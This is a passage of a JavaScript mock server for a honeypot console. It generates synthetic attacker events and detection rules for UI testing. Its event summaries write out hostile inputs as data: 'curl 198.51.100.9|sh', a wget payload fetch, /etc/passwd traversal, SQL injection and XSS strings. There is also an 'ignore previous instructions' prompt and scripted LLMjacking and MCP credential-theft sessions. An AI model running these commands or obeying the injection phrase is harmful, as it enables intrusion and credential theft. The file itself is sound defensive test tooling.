#!/usr/bin/env node
// Development mock of the console API v1 (docs/architecture/console-api.md).
//
// Serves the embedded UI from ../static with the production security headers
// and answers every endpoint from deterministic synthetic data, so the UI can
// be built and reviewed without a running AegisMesh node.
//
//   node internal/consoleui/devserver/mock-server.mjs [--port 9121] [--fleet hub|agent|both|none]
//     [--accept-evidence on|off] [--burst N] [--auth token|oidc|both] [--tenants a,b]
//     [--round4 on|off] [--round5 on|off] [--fail-prefs] [--round6 on|off] [--settings-editing on|off]
//
// Loopback only. Synthetic data only: addresses come from the RFC 5737 /
// RFC 3849 documentation ranges. Dev tokens (never valid anywhere else):
//   dev-viewer, dev-analyst, dev-admin
// With --auth oidc|both a fake identity provider at /__mock/idp stands in for
// a real one: it lists synthetic identities and every failure the console's
// callback can report. It performs no real OpenID Connect.
// This is a test fixture, not the product server: it is not embedded and
// never ships in the binary.

import http from 'node:http';
import { readFile } from 'node:fs/promises';
import { randomBytes, createHash } from 'node:crypto';
import { gzipSync } from 'node:zlib';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createFleet } from './mock-fleet.mjs';
import { snapshot, sessionsOf, publicSession, sessionDetail, coverageOf, indicatorsOf, renderIndicators, renderReport, RULE_FRAMEWORKS, INTERPRETATION } from './mock-analysis.mjs';
import { ruleRecord, decoyCatalog, tokenCatalog, decoysView, honeytokensView, interArrival, digestOf, renderEvents, EXPORT_FORMATS, EXPORT_NAMES, EXPORT_TYPES, CATALOG_WINDOWS, DIGEST_WINDOWS } from './mock-catalogs.mjs';
import { campaignsOf, campaignDetail, publicCampaign, actorOf, postureOf } from './mock-insight.mjs';
import { createAccounts, clientFamily } from './mock-accounts.mjs';
import { BUILTIN, createAcceptance } from './mock-roles.mjs';
import { matchesEventFilters, normalizeEventFilters, EVENT_FILTER_KEYS } from '../static/assets/js/lib/route.js';
import { normalizeNodeFilter, originOf, LOCAL } from '../static/assets/js/lib/origin.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const STATIC = path.resolve(HERE, '../static');
// The project site, served read-only under /__site/ so it can be checked in a
// browser with the same security headers (a development convenience).
const SITE_DIR = path.resolve(HERE, '../../../site');
const argPort = process.argv.indexOf('--port');
const PORT = Number(argPort > 0 ? process.argv[argPort + 1] : process.env.PORT || 9121);
const HOST = '127.0.0.1';
// --fleet hub|agent|both|none selects which fleet roles this mock node has
// (default hub). "none" and "agent" exercise the hub-disabled responses.
const argFleet = process.argv.indexOf('--fleet');
const FLEET_MODE = argFleet > 0 ? process.argv[argFleet + 1] : (process.env.AEGISMESH_MOCK_FLEET || 'hub');
if (!['hub', 'agent', 'both', 'none'].includes(FLEET_MODE)) throw new Error('--fleet must be hub, agent, both or none');
// --accept-evidence on|off: whether the mock hub accepts forwarded evidence
// (default on; meaningful only with a hub). Off: no forwarded events, no
// by_node, and forwarding agents report evidence_disabled.
const argAccept = process.argv.indexOf('--accept-evidence');
const ACCEPT_ARG = argAccept > 0 ? process.argv[argAccept + 1] : (process.env.AEGISMESH_MOCK_ACCEPT_EVIDENCE || 'on');
if (!['on', 'off'].includes(ACCEPT_ARG)) throw new Error('--accept-evidence must be on or off');
// --auth token|oidc|both: which sign-in methods GET /meta advertises (default
// token, like a server without OIDC configured).
const argAuth = process.argv.indexOf('--auth');
const AUTH_MODE = argAuth > 0 ? process.argv[argAuth + 1] : (process.env.AEGISMESH_MOCK_AUTH || 'token');
if (!['token', 'oidc', 'both'].includes(AUTH_MODE)) throw new Error('--auth must be token, oidc or both');
const TOKEN_AUTH = AUTH_MODE !== 'oidc';
const OIDC_AUTH = AUTH_MODE !== 'token';
// --tenants a,b: declared tenants (default one tenant, "default"). The first
// is console.local_tenant: it owns this node's sensors, rules, node metadata
// and agent status. Every other tenant holds only what its own fleet
// registry forwarded, so its data is visibly different.
// Round-4 endpoints (campaigns, actor profiles, posture). `off` behaves like
// an older server: 404 on the new routes and no new session fields.
const argRound4 = process.argv.indexOf('--round4');
const ROUND4 = (argRound4 > 0 ? process.argv[argRound4 + 1] : (process.env.AEGISMESH_MOCK_ROUND4 || 'on')) !== 'off';

// Round-5 endpoints (accounts, access, settings; contract r5). `off` behaves
// like an older server: 404 on /me, /admin/* and /system, and API keys do not
// sign in. --fail-prefs makes PUT /me/preferences answer 503, to exercise the
// console's rollback.
const argRound5 = process.argv.indexOf('--round5');
const ROUND5 = (argRound5 > 0 ? process.argv[argRound5 + 1] : (process.env.AEGISMESH_MOCK_ROUND5 || 'on')) !== 'off';
const FAIL_PREFS = process.argv.includes('--fail-prefs');

// Round-6 endpoints (permissions, custom roles, editable console settings,
// accepted posture risk; contract r6). `off` (implied by --round5 off)
// behaves like a round-5 server: 404 on the new routes, no new fields, and
// only the built-in roles. --settings-editing on|off mirrors
// console.settings_editing ("console" or the default "off" on a real
// server; the mock defaults to on so every editing state can be reviewed).
const argRound6 = process.argv.indexOf('--round6');
const ROUND6 = ROUND5 && (argRound6 > 0 ? process.argv[argRound6 + 1] : (process.env.AEGISMESH_MOCK_ROUND6 || 'on')) !== 'off';
const argEditing = process.argv.indexOf('--settings-editing');
const EDIT_ARG = argEditing > 0 ? process.argv[argEditing + 1] : (process.env.AEGISMESH_MOCK_SETTINGS_EDITING || 'on');
if (!['on', 'off'].includes(EDIT_ARG)) throw new Error('--settings-editing must be on or off');
const SETTINGS_EDITING = EDIT_ARG === 'on';

const argTenants = process.argv.indexOf('--tenants');
const TENANTS = (argTenants > 0 ? process.argv[argTenants + 1] : (process.env.AEGISMESH_MOCK_TENANTS || 'default')).split(',').map((t) => t.trim()).filter(Boolean);
if (!TENANTS.length || TENANTS.length > 32 || TENANTS.some((t) => !/^[a-z0-9][a-z0-9_-]{0,31}$/.test(t)) || new Set(TENANTS).size !== TENANTS.length) {
  throw new Error('--tenants takes 1..32 distinct names matching [a-z0-9][a-z0-9_-]{0,31}');
}
const LOCAL_TENANT = TENANTS[0];

const CSP = "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'";
const TYPES = { '.html': 'text/html; charset=utf-8', '.css': 'text/css; charset=utf-8', '.js': 'text/javascript; charset=utf-8', '.svg': 'image/svg+xml' };
const SESSION_TTL = 3600;

// ---- Deterministic synthetic data ------------------------------------------

let seed = 0x5eed1234;
const rand = () => {
  seed = (seed * 1664525 + 1013904223) >>> 0;
  return seed / 2 ** 32;
};
const pick = (arr) => arr[Math.floor(rand() * arr.length)];
const hex = (n) => Array.from({ length: n }, () => Math.floor(rand() * 16).toString(16)).join('');

const SENSORS = [
  { id: 'web', kind: 'http', listen: '127.0.0.1:8080', state: 'running', process_isolation: false },
  { id: 'mcp-tools', kind: 'mcp', listen: '127.0.0.1:8090', state: 'running', process_isolation: true },
  { id: 'ssh-decoy', kind: 'ssh', listen: '127.0.0.1:2222', state: 'running', process_isolation: true },
  { id: 'redis-lure', kind: 'tcp', listen: '127.0.0.1:6380', state: 'failed', process_isolation: false },
];

// Worst-case evidence on purpose: markup, RTL, emoji, very long strings,
// IPv6 and a correlation key containing "/".
const SOURCES = [
  '203.0.113.7', '198.51.100.23', '192.0.2.44', '2001:db8::1f', '203.0.113.250',
  'corr:203.0.113.7/mcp-tools', '198.51.100.9', '2001:db8:ffff:ffff:ffff:ffff:ffff:fffe',
];
const SUMMARIES = {
  http: ['GET /admin → 200', 'POST /wp-login.php → 401', 'GET /.env → 404', 'GET /<script>alert(1)</script> → 404',
    'GET /api/v1/users?id=1%27%20OR%201=1-- → 400', `GET /${'a'.repeat(180)} → 414`, 'GET /‮gnp.exe → 404'],
  mcp: ['tools/call read_file path=../../etc/passwd', 'tools/list', 'tools/call exec_shell cmd="curl 198.51.100.9|sh"', 'prompts/get name="ignore previous instructions 🙂"'],
  ssh: ['auth password user=root', 'auth publickey user=deploy', 'client SSH-2.0-libssh_0.9.6'],
  tcp: ['AUTH hunter2-redacted', 'CONFIG SET dir /var/spool/cron', 'PING'],
};
const DETECTION_RULES = [
  { id: 'PI-001', title: 'Prompt-injection phrasing in tool input', severity: 'high' },
  { id: 'PT-002', title: 'Path traversal sequence', severity: 'medium' },
  { id: 'CMD-003', title: 'Shell command in tool arguments', severity: 'critical' },
  { id: 'SCAN-004', title: 'Well-known scanner path', severity: 'low' },
  { id: 'AUTH-005', title: 'Credential guessing', severity: 'info' },
];
const CORRELATION_RULES = [
  { id: 'CR-MULTI-SENSOR', title: 'Same source touched several sensors' },
  { id: 'CR-CANARY-AFTER-SCAN', title: 'Canary invoked after reconnaissance' },
];

// More backend catalog rules (the AI pack and others with framework
// references). Kept apart from DETECTION_RULES so the
// seeded random data set above is unchanged.
const AI_RULES = [
  { id: 'LLM-001', family: 'detection', title: 'Known AI API path or MCP message', severity: 'low' },
  { id: 'LLM-002', family: 'detection', title: 'Minimal-cost completion probe', severity: 'medium' },
  { id: 'LLM-003', family: 'detection', title: 'Model or key mutation on an AI service', severity: 'medium' },
  { id: 'LLM-004', family: 'detection', title: 'Provider-shaped key in a credential context', severity: 'low' },
  { id: 'HT-001', family: 'detection', title: 'Decoy credential marker presented inbound', severity: 'critical' },
  { id: 'AGT-001', family: 'detection', title: 'Agent marker followed a decoy instruction', severity: 'high' },
  { id: 'PI-002', family: 'detection', title: 'Obfuscated prompt-injection phrasing', severity: 'high' },
  { id: 'EXF-001', family: 'detection', title: 'Credential or secret requested from a tool', severity: 'high' },
  { id: 'ESC-001', family: 'detection', title: 'Tool call asking for command execution', severity: 'high' },
  { id: 'RES-001', family: 'detection', title: 'Oversized or repeated resource request', severity: 'medium' },
  { id: 'COR-005', family: 'correlation', title: 'Machine-paced cadence from one peer', severity: '' },
  { id: 'COR-006', family: 'correlation', title: 'One source touched several AI families', severity: '' },
  { id: 'COR-007', family: 'correlation', title: 'Distinct credential attempts from one source', severity: '' },
  { id: 'COR-008', family: 'correlation', title: 'Decoy credential replayed after contact elsewhere', severity: '' },
  // MCP decoy environment observations (titles from the backend catalog).
  { id: 'MCP-001', family: 'detection', title: 'declared synthetic credential content was requested', severity: 'medium' },
  { id: 'MCP-002', family: 'detection', title: 'connection reached the configured MCP exploration depth', severity: 'low' },
  { id: 'MCP-003', family: 'detection', title: 'write or execution shaped MCP tool was requested; nothing was executed', severity: 'medium' },
];
const AI_SENSORS = [
  { id: 'ai-ollama', kind: 'http', listen: '127.0.0.1:11434', state: 'running', process_isolation: false },
  { id: 'ai-litellm', kind: 'http', listen: '127.0.0.1:8001', state: 'running', process_isolation: false },
  // A synthetic MCP workspace (environment: list_files, read_file, get_env,
  // search, run_query over declared fake entries; nothing real behind it).
  { id: 'ai-workspace', kind: 'mcp', listen: '127.0.0.1:8002', state: 'running', process_isolation: false },
];

// Every catalog rule with family, title and severity ('' for correlations).
const CATALOG_RULES = [
  ...DETECTION_RULES.map((r) => ({ ...r, family: 'detection' })),
  ...CORRELATION_RULES.map((r) => ({ ...r, family: 'correlation', severity: '' })),
  ...AI_RULES,
];
const RULE_BY_ID = new Map(CATALOG_RULES.map((r) => [r.id, r]));

const now = Date.now();
let seq = 0;

// Scripted attacker sessions, built without the seeded generator (so the
// random data set is unchanged): an LLMjacking-style run (AI endpoint
// enumeration, a one-token key validation, a decoy credential replay, an
// agent canary), an SSH credential-stuffing run and a slow, human-paced
// browse. Times are relative to start-up; ids are hashes of fixed labels.
function storyEvents() {
  const out = [];
  const sensorOf = (id) => [...SENSORS, ...AI_SENSORS].find((x) => x.id === id);
  const sevOf = (rules) => rules.map((r) => AI_RULES.find((x) => x.id === r)?.severity || DETECTION_RULES.find((x) => x.id === r)?.severity || '').reduce((m, v) => (['', 'info', 'low', 'medium', 'high', 'critical'].indexOf(v) > ['', 'info', 'low', 'medium', 'high', 'critical'].indexOf(m) ? v : m), '');
  const add = (label, t, sensorId, summary, rules = [], classification = 'interaction', source, tokens) => {
    const sn = sensorOf(sensorId) || { id: 'correlator', kind: '', listen: '' };
    const signal = classification === 'correlation_signal';
    out.push({
      id: createHash('sha256').update(`story:${label}`).digest('hex').slice(0, 32), time: new Date(t).toISOString(), seq: 0,
      sensor: signal ? { id: 'correlator', kind: '', listen: '' } : { id: sn.id, kind: sn.kind, listen: sn.listen },
      classification, source, summary, severity: signal ? '' : sevOf(rules), rule_ids: rules, action: rules.length ? 'observe' : '', _integrity: true, _story: true,
      ...(tokens ? { _tokens: tokens } : {}),
    });
  };
  // 1. LLMjacking-style: ~0.7 s apart, 25 minutes ago.
  const A = '203.0.113.66';
  let t = now - 25 * 60e3;
  const step = (n) => { t += 640 + ((n * 37) % 9) * 20; return t; };
  const llm = [
    ['ai-ollama', 'GET / → 200 "Ollama is running"', ['LLM-001']],
    ['ai-ollama', 'GET /api/version → 200', ['LLM-001']],
    ['ai-ollama', 'GET /api/tags → 200 (3 models)', ['LLM-001']],
    ['ai-litellm', 'GET /v1/models → 200', ['LLM-001']],
    ['sig', 'COR-006: one source touched ollama and openai-compatible surfaces', ['COR-006']],
    ['ai-ollama', 'POST /api/generate model=llama3 num_predict=1 prompt="hi" → 200', ['LLM-001', 'LLM-002']],
    ['ai-litellm', 'GET /key/info → 200', ['LLM-001']],
    ['ai-litellm', 'POST /v1/chat/completions Authorization: Bearer [honeytoken:planted-key] max_tokens=1 → 200', ['HT-001', 'LLM-001', 'LLM-002']],
    ['sig', 'COR-008: decoy credential replayed on ai-litellm after contact on ai-ollama', ['COR-008']],
    ['ai-litellm', 'GET /model/info → 200', ['LLM-001']],
    ['ai-litellm', 'GET /diagnostics/echo?m=[agent-marker:diagnostic-echo] → 200', ['AGT-001', 'LLM-001']],
    ['ai-ollama', 'POST /api/pull name="llama3:70b" → 200 (static)', ['LLM-001', 'LLM-003']],
    ['sig', 'COR-005: consistent with scripted or agent-driven activity', ['COR-005']],
  ];
  // Planted ids presented inbound (the values never exist in the mock).
  const llmTokens = { 7: ['planted-key'], 10: ['diagnostic-echo'] };
  llm.forEach(([sid, summary, rules], i) => add(`llm-${i}`, step(i), sid, summary, rules, sid === 'sig' ? 'correlation_signal' : 'interaction', A, llmTokens[i]));
  // 4. MCP decoy environment exploration, 50 minutes ago, ~0.8 s apart on one
  // connection: list files, read a secret-shaped file, read a fake env value,
  // try an execution-shaped tool, then replay the planted credential on
  // another sensor 40 s later (HT-001, then COR-008).
  const D = '198.51.100.140';
  t = now - 50 * 60e3;
  const mcp = [
    ['ai-workspace', 'initialize client="workspace-agent/0.1"', [], 'interaction'],
    ['ai-workspace', 'tools/list → 5 environment tools', [], 'interaction'],
    ['ai-workspace', 'tools/call list_files → README.md, .env, deploy/notes.md', [], 'canary_invocation'],
    ['ai-workspace', 'tools/call read_file path="README.md"', [], 'canary_invocation'],
    ['ai-workspace', 'tools/call read_file path=".env" → [synthetic credential content]', ['MCP-001'], 'canary_invocation'],
    ['ai-workspace', 'tools/call get_env name="OPENAI_API_KEY" → [synthetic credential content]', ['MCP-001', 'MCP-002'], 'canary_invocation'],
    ['ai-workspace', 'tools/call search query="password"', ['MCP-002'], 'canary_invocation'],
    ['ai-workspace', 'tools/call run_shell cmd="env | grep KEY" → not found (nothing executed)', ['MCP-002', 'MCP-003'], 'canary_invocation'],
  ];
  mcp.forEach(([sid, summary, rules, cls], i) => { t += 760 + ((i * 41) % 7) * 30; add(`mcp-${i}`, t, sid, summary, rules, cls, D); });
  t += 40e3;
  add('mcp-replay', t, 'ai-litellm', 'POST /v1/chat/completions Authorization: Bearer [honeytoken:workspace-key] max_tokens=1 → 200', ['HT-001', 'LLM-001', 'LLM-002'], 'interaction', D, ['workspace-key']);
  add('mcp-cor8', t + 4, 'sig', 'COR-008: decoy credential presented on ai-litellm after contact on ai-workspace', ['COR-008'], 'correlation_signal', D);
  // 2. SSH credential stuffing: ~2 s apart, 3 hours ago.
  const B = '198.51.100.77';
  t = now - 3 * 3600e3;
  const users = ['root', 'admin', 'ubuntu', 'oracle', 'test', 'git', 'deploy', 'pi'];
  for (let i = 0; i < 36; i++) {
    t += 1900 + ((i * 53) % 5) * 40;
    add(`ssh-${i}`, t, 'ssh-decoy', `auth password user=${users[i % users.length]} password=[redacted]`, i % 9 === 4 ? ['AUTH-005'] : [], 'interaction', B);
    if (i === 20) add('ssh-cor7', t + 5, 'sig', 'COR-007: 20 distinct credential attempts from one source', ['COR-007'], 'correlation_signal', B);
  }
  // 3. Slow, human-paced browsing: irregular gaps of 3 to 25 minutes.
  const C = '192.0.2.150';
  t = now - 9 * 3600e3;
  const slow = [['GET / → 200', []], ['GET /robots.txt → 404', []], ['GET /admin → 200', []], ['GET /admin/login → 200', []], ['POST /admin/login → 401', []], ['GET /.git/config → 404', ['SCAN-004']], ['GET /admin/login → 200', []], ['POST /admin/login → 401', []], ['GET /docs → 404', []]];
  const waits = [0, 4, 17, 6, 3, 25, 12, 9, 21];
  slow.forEach(([summary, rules], i) => { t += waits[i] * 60e3 + i * 7000; add(`slow-${i}`, t, 'web', summary, rules, 'interaction', C); });
  // 5. Campaigns (round 4): other sources running the same playbooks at
  // other times. The LLMjacking opening (root, version, tags, models) from
  // three more sources; the MCP workspace opening from two more; an SSH
  // spray-then-execute playbook from two sources. Each variant skips or
  // adds a step, so the campaign score has gaps to show.
  const run = (prefix, source, start, gap, steps) => {
    t = start;
    steps.forEach(([sid, summary, rules = [], cls = 'interaction', tokens], i) => {
      t += gap + ((i * 29) % 5) * Math.round(gap / 20);
      add(`${prefix}-${i}`, t, sid, summary, rules, cls, source, tokens);
    });
  };
  const llmOpen = [
    ['ai-ollama', 'GET / → 200 "Ollama is running"', ['LLM-001']],
    ['ai-ollama', 'GET /api/version → 200', ['LLM-001']],
    ['ai-ollama', 'GET /api/tags → 200 (3 models)', ['LLM-001']],
    ['ai-litellm', 'GET /v1/models → 200', ['LLM-001']],
  ];
  run('cmpA1', '203.0.113.81', now - 2 * 3600e3, 660, [...llmOpen,
    ['ai-ollama', 'POST /api/generate model=llama3 num_predict=1 prompt="hi" → 200', ['LLM-001', 'LLM-002']],
    ['ai-litellm', 'POST /v1/chat/completions model=gpt-4o max_tokens=1 → 401', ['LLM-001', 'LLM-002']],
    ['ai-litellm', 'GET /model/info → 200', ['LLM-001']]]);
  run('cmpA2', '198.51.100.212', now - 5 * 3600e3, 1200, [...llmOpen,
    ['ai-ollama', 'POST /api/generate model=llama3 num_predict=1 prompt="ping" → 200', ['LLM-001', 'LLM-002']],
    ['ai-litellm', 'GET /key/info → 200', ['LLM-001']],
    ['ai-litellm', 'POST /v1/chat/completions Authorization: Bearer [honeytoken:planted-key] max_tokens=1 → 200', ['HT-001', 'LLM-001', 'LLM-002'], 'interaction', ['planted-key']],
    ['ai-litellm', 'GET /model/info → 200', ['LLM-001']]]);
  run('cmpA3', '2001:db8::77', now - 18 * 3600e3, 720, [...llmOpen,
    ['ai-ollama', 'POST /api/pull name="llama3:70b" → 200 (static)', ['LLM-001', 'LLM-003']]]);
  const mcpOpen = [
    ['ai-workspace', 'initialize client="workspace-agent/0.1"'],
    ['ai-workspace', 'tools/list → 5 environment tools'],
    ['ai-workspace', 'tools/call list_files → README.md, .env, deploy/notes.md', [], 'canary_invocation'],
    ['ai-workspace', 'tools/call read_file path=".env" → [synthetic credential content]', ['MCP-001'], 'canary_invocation'],
  ];
  run('cmpB1', '192.0.2.71', now - 8 * 3600e3, 820, [...mcpOpen,
    ['ai-workspace', 'tools/call get_env name="AWS_SECRET_ACCESS_KEY" → [synthetic credential content]', ['MCP-001', 'MCP-002'], 'canary_invocation']]);
  run('cmpB2', '203.0.113.140', now - 30 * 3600e3, 900, [...mcpOpen,
    ['ai-workspace', 'tools/call run_shell cmd="id" → not found (nothing executed)', ['MCP-002', 'MCP-003'], 'canary_invocation'],
    ['ai-workspace', 'tools/call search query="token"', ['MCP-002'], 'canary_invocation']]);
  const sshPlay = (users) => [
    ...users.map((u) => ['ssh-decoy', `auth password user=${u} password=[redacted]`]),
    ['ssh-decoy', 'session open shell (decoy prompt)'],
    ['ssh-decoy', 'exec class=recon cmd="uname -a; nproc"'],
    ['ssh-decoy', 'exec class=download cmd="wget http://198.51.100.9/x.sh" (nothing fetched)'],
    ['ssh-decoy', 'exec class=persistence cmd="crontab -l" (decoy output)'],
  ];
  run('cmpC1', '198.51.100.31', now - 4 * 3600e3, 2400, sshPlay(['root', 'admin', 'ubuntu', 'pi']));
  run('cmpC2', '203.0.113.177', now - 11 * 3600e3, 2600, sshPlay(['root', 'admin', 'test']).filter((s) => !/persistence/.test(s[1])));
  return out;
}

function makeEvent(t, overrides = {}) {
  const sensor = overrides.sensor || pick(SENSORS);
  const r = rand();
  const classification = overrides.classification || (r < 0.08 ? 'canary_invocation' : 'interaction');
  const rules = rand() < 0.3 ? [pick(DETECTION_RULES)] : [];
  const severity = rules.length ? rules[0].severity : '';
  const ev = {
    id: hex(32), time: new Date(t).toISOString().replace('.000Z', 'Z'), seq: ++seq,
    sensor: { id: sensor.id, kind: sensor.kind, listen: sensor.listen },
    classification, source: overrides.source ?? pick(SOURCES),
    summary: overrides.summary || pick(SUMMARIES[sensor.kind]),
    severity: overrides.severity ?? severity,
    rule_ids: overrides.rule_ids || rules.map((x) => x.id),
    action: rules.length ? 'observe' : '',
    _integrity: rand() < 0.01 ? false : true,
  };
  return ev;
}

const keyOf = (id, origin) => `${id}|${origin}`;
const stamp = () => new Date().toISOString().replace(/\.\d+Z$/, 'Z');

// ---- Tenants ------------------------------------------------------------------
//
// Each tenant has its own index, investigations, audit chain and fleet
// registry. The local tenant is built first with the original seed order, so
// the default single-tenant data set is unchanged.

function buildTenant(name, local) {
  const t = { name, local, events: [], investigations: new Map(), audit: [], prevHash: '0'.repeat(64) };
  // Fleet first: on an accepting hub the index also holds evidence forwarded
  // by some synthetic nodes.
  t.fleet = createFleet({
    mode: FLEET_MODE, acceptEvidence: ACCEPT_ARG === 'on', tenant: name,
    namePrefix: local ? '' : name, localAgent: local,
    forwardedCount: (id) => t.events.filter((e) => e.node?.id === id).length,
  });
  const events = t.events;
  if (local) {
    for (let i = 0; i < 1400; i++) {
      const age = Math.floor(rand() ** 1.6 * 7 * 24 * 3600 * 1000);
      events.push(makeEvent(now - age));
    }
    events.sort((a, b) => Date.parse(b.time) - Date.parse(a.time));
    // A handful of correlation signals citing earlier interactions.
    for (let i = 0; i < 18; i++) {
      const base = events[20 + i * 37];
      const rule = pick(CORRELATION_RULES);
      const sig = makeEvent(Date.parse(base.time) + 2000, {
        classification: 'correlation_signal', source: base.source, sensor: SENSORS[0],
        summary: `${rule.title}: ${base.source}`, rule_ids: [rule.id], severity: pick(['medium', 'high']),
      });
      sig.sensor = { id: 'correlator', kind: '', listen: '' };
      sig._cites = [base.id, events[21 + i * 37].id];
      events.push(sig);
    }
    events.push(...storyEvents());
  }
  // Forwarded copies. Forwarding is live, so they cover only the time since
  // this (synthetic) hub started: the last 20 hours. One copy deliberately
  // reuses a local event id: ids are unique only within an origin.
  const counts = local ? [140, 70, 45] : [210, 60];
  t.fleet.evidenceNodes.forEach((n, k) => {
    const count = counts[k] ?? 30;
    for (let i = 0; i < count; i++) {
      const e = makeEvent(now - Math.floor(rand() ** 1.3 * FORWARD_SPAN));
      e.node = { id: n.id, name: n.name };
      events.push(e);
    }
  });
  if (local && t.fleet.evidenceNodes.length) {
    const twin = events.find((e) => !e.node && Date.parse(e.time) > now - FORWARD_SPAN);
    const copy = events.find((e) => e.node?.id === t.fleet.evidenceNodes[t.fleet.evidenceNodes.length - 1].id);
    if (twin && copy) copy.id = twin.id;
  }
  events.sort((a, b) => Date.parse(b.time) - Date.parse(a.time));
  // Scripted sessions keep milliseconds: their sub-second cadence is the point.
  events.forEach((e) => { if (!e._story) e.time = e.time.replace(/\.\d+Z$/, 'Z'); });
  // Events are found by id within an origin ("local" or a node id).
  t.byKey = new Map(events.map((e) => [keyOf(e.id, originOf(e)), e]));
  t.localById = (id) => t.byKey.get(keyOf(id, LOCAL));
  t.localEvents = () => events.filter((e) => !e.node);
  if (local) {
    const a = newInv(t, 'MCP tool abuse from 203.0.113.7', 'high', t.localEvents().filter((e) => e.source === '203.0.113.7').slice(0, 6).map((e) => e.id), 'ana');
    a.event_ids.push('f'.repeat(32)); // aged out of the index on purpose
    a.notes.push({ id: hex(8), time: a.created_at, author: 'ana', text: 'Read_file attempts against ../../etc/passwd, then a canary hit.\nNo outbound activity observed.' });
    newInv(t, 'Scanner noise baseline', 'low', t.localEvents().slice(100, 103).map((e) => e.id), 'ada', 'monitoring');
    newInv(t, 'Closed: SSH credential spray', 'medium', [], 'ana', 'closed');
  } else {
    // Investigations annotate local observations only; this tenant has none,
    // so its cases hold notes but no attached evidence.
    const a = newInv(t, `Lisbon edge sweep (${name})`, 'medium', [], 'ana');
    a.notes.push({ id: hex(8), time: a.created_at, author: 'ana', text: `Forwarded copies only in tenant ${name}; each node's own store is authoritative.` });
  }
  return t;
}

function newInv(t, title, priority, eventIds, by, status = 'open') {
  const id = `inv_${hex(12)}`;
  const ts = stamp();
  const inv = { id, title, status, priority, created_at: ts, updated_at: ts, created_by: by, event_ids: [...eventIds], notes: [] };
  t.investigations.set(id, inv);
  return inv;
}

// Audit records chain per tenant. OIDC records add `issuer` and `subject`
// (both external claims); other records omit them.
function record(t, actor, role, action, target, outcome, remote, detail = '', extra = {}) {
  const rec = { seq: t.audit.length + 1, time: stamp(), actor, role, action, target, outcome, remote, detail, ...extra, prev_hash: t.prevHash };
  rec.hash = createHash('sha256').update(JSON.stringify(rec)).digest('hex');
  t.prevHash = rec.hash;
  t.audit.push(rec);
}

const FORWARD_SPAN = 20 * 3600e3;
const tenants = new Map(TENANTS.map((name, i) => [name, buildTenant(name, i === 0)]));
const localTenant = tenants.get(LOCAL_TENANT);

const summaryOf = (e) => {
  const { _integrity, _cites, _story, _tokens, ...pub } = e;
  return pub;
};

// ---- Principals, sessions -------------------------------------------------------

// Membership: admin and analyst belong to every tenant (in declared order);
// the viewer only to the local tenant, so one principal sees tenant UI
// without a switcher.
const ALL = [...TENANTS];
const TOKENS = new Map([
  ['dev-viewer', { name: 'vera', role: 'viewer', tenants: [LOCAL_TENANT] }],
  ['dev-analyst', { name: 'ana', role: 'analyst', tenants: ALL }],
  ['dev-admin', { name: 'ada', role: 'admin', tenants: ALL }],
]);
// Synthetic identities at the fake provider. Subjects are external claims
// and deliberately awkward (markup, a right-to-left override) to exercise
// evidence rendering in the audit trail. "nobody" has no operator mapping.
const OIDC_ISSUER = `http://${HOST}:${PORT}/__mock/idp`;
const OIDC_DISPLAY_NAME = 'Example IdP (mock)';
const IDENTITIES = new Map([
  ['ada', { sub: '00u1ada-synthetic-7f3c', name: 'ada@example.test', role: 'admin', tenants: [...ALL].reverse() }],
  ['ana', { sub: 'auth0|ana‮txt.exe', name: 'ana@example.test', role: 'analyst', tenants: ALL }],
  ['vera', { sub: '<b>vera</b>@example.test', name: 'vera@example.test', role: 'viewer', tenants: [LOCAL_TENANT] }],
  ['nobody', { sub: 'unmapped-synthetic-0000', name: '', role: '', tenants: [] }],
]);

const sessions = new Map(); // sid → { name, role, auth_method, tenant, tenants, csrf_token, expires_at, account_id, created_at, last_seen_at, remote, client }
const accounts = createAccounts({ tenants: TENANTS, localTenant: LOCAL_TENANT, configured: TOKENS, tokenLogin: TOKEN_AUTH, round6: ROUND6, settingsEditing: SETTINGS_EDITING });
const acceptance = createAcceptance({ round6: ROUND6 });

// The posture review of a tenant; with round 6, a check derived from the
// console settings overlay and accepted risk.
function postureBody(T, events, { raw = false } = {}) {
  const sensorsList = T.local ? [...SENSORS, ...AI_SENSORS] : [];
  const tokens = T.local ? tokenCatalog(decoyCatalog(sensorsList)) : [];
  const body = postureOf({ sensors: sensorsList, honeytokens: tokens, rules: CATALOG_RULES.length, index: snapshot(events).bounds.index, principals: TOKENS.size, oidc: OIDC_AUTH });
  if (!ROUND6) return body;
  const ttl = accounts.overlay.sessionTtl();
  const long = ttl > 28800;
  body.checks.push({
    id: 'POS-015', area: 'access', status: long ? 'attention' : 'ok',
    title: long ? `Console sessions last ${Math.round(ttl / 3600)} hours` : 'Console sessions end within 8 hours',
    detail: `console.session_ttl_seconds is ${ttl}${long ? ', longer than the 8 hours the hardening guide suggests. A stolen session cookie stays useful that long.' : '.'}`,
    recommendation: long ? 'Keep sessions at 8 hours or less, or revert the console override in Settings, Security and access.' : '',
    doc: 'docs/configuration.md#console',
  });
  body.summary = { attention: 0, ok: 0, info: 0 };
  for (const c of body.checks) body.summary[c.status]++;
  return raw ? body : acceptance.decorate(body);
}

const sessionView = (s) => ({
  principal: { name: s.name, role: s.role, auth_method: s.auth_method, tenant: s.tenant, tenants: s.tenants },
  tenant: s.tenant, tenants: s.tenants, csrf_token: s.csrf_token, expires_at: s.expires_at,
});

function newSession(fields) {
  const sid = randomBytes(24).toString('base64url');
  const s = { csrf_token: randomBytes(24).toString('base64url'), expires_at: new Date(Date.now() + SESSION_TTL * 1000).toISOString().replace(/\.\d+Z$/, 'Z'), created_at: stamp(), ...fields };
  sessions.set(sid, s);
  return { sid, s };
}

const sessionCookie = (sid) => `aegismesh_session=${sid}; HttpOnly; SameSite=Strict; Path=/; Max-Age=${SESSION_TTL}`;

const invView = (t, inv, detail) => {
  const out = { ...inv };
  if (detail) {
    out.events = inv.event_ids.map(t.localById).filter(Boolean).map(summaryOf).sort((a, b) => Date.parse(b.time) - Date.parse(a.time));
  } else {
    delete out.notes;
  }
  return out;
};

// ---- HTTP helpers ----------------------------------------------------------

function securityHeaders(extra = {}) {
  return {
    'X-Content-Type-Options': 'nosniff', 'Referrer-Policy': 'no-referrer', 'X-Frame-Options': 'DENY',
    'Content-Security-Policy': CSP, ...extra,
  };
}

function send(res, status, body, headers = {}) {
  if (status === 204) {
